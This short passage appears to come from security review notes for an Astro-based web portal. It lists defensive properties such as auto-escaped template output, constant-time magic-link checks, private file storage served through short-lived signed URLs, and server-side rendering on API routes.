- Astro template syntax `{value}` auto-escapes; portal Astro pages render data via these (no `set:html` on user data; only on static JSON-LD).
- Magic link validation is constant-time.
- Files are stored with private ACL on DO Spaces and served only via signed URLs with 1-hour TTL.
- Per-route `prerender = false` is consistently set on API routes that need SSR-only middleware to fire.
